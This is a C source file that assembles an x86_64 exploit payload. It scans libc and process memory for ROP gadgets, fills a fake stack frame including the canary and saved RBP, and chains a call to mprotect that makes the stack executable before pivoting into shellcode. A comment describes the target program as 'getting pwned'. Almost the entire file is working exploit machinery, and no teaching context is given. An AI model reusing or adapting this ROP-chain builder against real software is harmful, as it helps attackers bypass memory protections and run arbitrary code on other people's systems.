#define _GNU_SOURCE
#include <assert.h>
#include <dlfcn.h>	// for dlsym()
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "payload.h"

void initload(PayloadPtr plp) {
	memset(plp, 0, sizeof(*plp));
	initShellcodeUnion(&plp->pl_scu);
} // initload()

ssize_t makeload(PayloadPtr plp, BaseAddressesPtr bap, char *p, ssize_t np) {
	// Gadgets as strings (x86_64)
	char s_popRDI[]	= {0x5f, 0xc3, 0};
	char s_popRSI[]	= {0x5e, 0xc3, 0};
	char s_popRDX[]	= {0x5a, 0xc3, 0};
	char s_nopNOP[]	= {0x90, 0x90, 0xc3, 0};

	// First try to find gadgets in libc
	Pointer	libc_popRDI = searchRegion(bap->regions + rt_libc, s_popRDI);
	Pointer	libc_popRSI = searchRegion(bap->regions + rt_libc, s_popRSI);
	Pointer	libc_popRDX = searchRegion(bap->regions + rt_libc, s_popRDX);

	// Next, get backup gadgets from fallbackGadgets()
	Pointer	fbg_popRDI = searchRegion(bap->regions + rt_basehook, s_popRDI);
	Pointer	fbg_popRSI = searchRegion(bap->regions + rt_basehook, s_popRSI);
	Pointer	fbg_popRDX = searchRegion(bap->regions + rt_basehook, s_popRDX);
	Pointer	fbg_nopNOP = searchRegion(bap->regions + rt_basehook, s_nopNOP);

	// Next, get backup gadgets from fallbackGadgets()
	Pointer	any_popRDI = searchMemory(s_popRDI);
	Pointer	any_popRSI = searchMemory(s_popRSI);
	Pointer	any_popRDX = searchMemory(s_popRDX);
	Pointer	any_nopNOP = searchMemory(s_nopNOP);

	// Things are wrong if I don't find the gadgets somewhere!
	assert(any_popRDI != NULL);
	assert(any_popRSI != NULL);
	assert(any_popRDX != NULL);
	assert(any_nopNOP != NULL); // This little guy is only found in fallbackGadgets()

	// We will need "mprotect()"
	Pointer	libc_mprotect = dlsym(RTLD_NEXT, "mprotect");

	// Buffer offsets are relative to the payload
	bap->buf_base = plp;

	// Payload Common
	PayloadCommonPtr pcp = &plp->pl_common;

	// Stack Frame
	StackFramePtr sfp   = &pcp->pc_stackFrame;
	sfp->sf_dst.o	    = indirectToOffset(&sfp->sf_dst,	'B', bap);
	sfp->sf_canary.o    = indirectToOffset(&sfp->sf_canary,	'B', bap);
	sfp->sf_rbp.o	    = indirectToOffset(&sfp->sf_rbp,	'B', bap);

	// ROP Chain
	ROPChainPtr rcp = &pcp->pc_ROPChain;

	if (libc_popRDI)
		rcp->rc_popRDI.o = pointerToOffset(libc_popRDI, 'L', bap);
	else if (fbg_popRDI)
		rcp->rc_popRDI.o = pointerToOffset(fbg_popRDI,  'F', bap);
	else
		rcp->rc_popRDI.o = pointerToOffset(any_popRDI,  'A', bap);
		
	rcp->rc_stackPage.o = pointerToOffset(bap->stack_base,	'S', bap);

	if (libc_popRSI)
		rcp->rc_popRSI.o = pointerToOffset(libc_popRSI, 'L', bap);
	else if (fbg_popRSI)
		rcp->rc_popRSI.o = pointerToOffset(fbg_popRSI,  'F', bap);
	else
		rcp->rc_popRSI.o = pointerToOffset(any_popRSI,  'A', bap);
		
	rcp->rc_stackSize   = getpagesize();

	if (libc_popRDX)
		rcp->rc_popRDX.o = pointerToOffset(libc_popRDX, 'L', bap);
	else if (fbg_popRDX)
		rcp->rc_popRDX.o = pointerToOffset(fbg_popRDX,  'F', bap);
	else
		rcp->rc_popRDX.o = pointerToOffset(any_popRDX,  'A', bap);
		
	rcp->rc_permission  = 0x7;

	if (fbg_nopNOP)
		rcp->rc_nop.o = pointerToOffset(fbg_nopNOP,     'F', bap);
	else
		rcp->rc_nop.o = pointerToOffset(any_nopNOP,     'A', bap);

	rcp->rc_mprotect.o  = pointerToOffset(libc_mprotect,	'L', bap);

	// Stack pivot
	rcp->rc_pivot.o     = pointerToOffset(&plp->pl_scu,	'B', bap);

	return makeShellcode(&plp->pl_scu.sc, p, np);
} // makeload()

void jropload(PayloadPtr plp, BaseAddressesPtr bap) {
	AddressUnionPtr aup = (AddressUnionPtr) plp;

	// Fixup code addresses
        for (size_t i = 0; i < sizeof(PayloadCommon) / sizeof(AddressUnionPtr); i++)
		if ( aup[i].o.b == 'F' || aup[i].o.b == 'L' )
                	aup[i] = fixupAddressUnion(aup[i], bap);
} // jropload()

// This function MUST return a malloc()'ed block of memory to avoid stack corruption (it's ok, the program's getting pwned).
Pointer dofixups(Pointer src, size_t n, BaseAddressesPtr bap) {
        size_t nAUP = (n < sizeof(PayloadCommon) ? n : sizeof(PayloadCommon)) - sizeof(AddressUnionPtr) + 1;
        AddressUnionPtr srcAUP = (AddressUnionPtr) src;
        AddressUnionPtr dstAUP = (AddressUnionPtr) calloc(nAUP, sizeof(AddressUnion));

        for (size_t i = 0; i < nAUP; i++)
                dstAUP[i] = fixupAddressUnion(srcAUP[i], bap);

        return (Pointer) dstAUP;
} // dofixups()

static char *p8(void *s0, char *d) {
	char *s = (char *) s0;

	for (int i = 0; i < sizeof(Pointer); i++)
		d[i] = ((s[i] < ' ') || (s[i] > '~')) ? '.' : s[i];

	return d;
}

void dumpload(PayloadPtr plp, BaseAddressesPtr bap, char *title) {
	char fmt[] = "%20s: %018p (\"%.8s\")\n";
	char d[sizeof(Pointer)];

	assert(sizeof(d) == 8);

	PayloadCommonPtr pcp = &plp->pl_common;
	StackFramePtr sfp = &pcp->pc_stackFrame;
	ROPChainPtr rcp = &pcp->pc_ROPChain;

	fprintf(stderr, "-----------------------------------------------------\n");
	fprintf(stderr, "%s\n", title);
	fprintf(stderr, "-----------------------------------------------------\n");
	fprintf(stderr, fmt, "sf_dst.p",        sfp->sf_dst.p,       p8(&sfp->sf_dst,        d));
	fprintf(stderr, fmt, "sf_canary.p",     sfp->sf_canary.p,    p8(&sfp->sf_canary,     d));
	fprintf(stderr, fmt, "sf_rbp.p",        sfp->sf_rbp.p,       p8(&sfp->sf_rbp,        d));
	fprintf(stderr, "\n");
	fprintf(stderr, fmt, "rc_popRDI.p",     rcp->rc_popRDI.p,    p8(&rcp->rc_popRDI,     d));
	fprintf(stderr, fmt, "rc_stackPage.p",  rcp->rc_stackPage.p, p8(&rcp->rc_stackPage,  d));
	fprintf(stderr, fmt, "rc_popRSI.p",     rcp->rc_popRSI.p,    p8(&rcp->rc_popRSI,     d));
	fprintf(stderr, fmt, "rc_stackSize",    rcp->rc_stackSize,   p8(&rcp->rc_stackSize,  d));
	fprintf(stderr, fmt, "rc_popRDX.p",     rcp->rc_popRDX.p,    p8(&rcp->rc_popRDX,     d));
	fprintf(stderr, fmt, "rc_permission",   rcp->rc_permission,  p8(&rcp->rc_permission, d));
	fprintf(stderr, fmt, "rc_noop.p",       rcp->rc_nop.p,       p8(&rcp->rc_nop,        d));
	fprintf(stderr, fmt, "rc_mprotect.p",   rcp->rc_mprotect.p,  p8(&rcp->rc_mprotect,   d));
	fprintf(stderr, "\n");
	fprintf(stderr, fmt, "rc_pivot.p",      rcp->rc_pivot.p,     p8(&rcp->rc_pivot,      d));
	fprintf(stderr, "\n");

	dumpShellcode(&plp->pl_scu.sc);
	fprintf(stderr, "-----------------------------------------------------\n");
	fprintf(stderr, "\n");
} // dumpload()
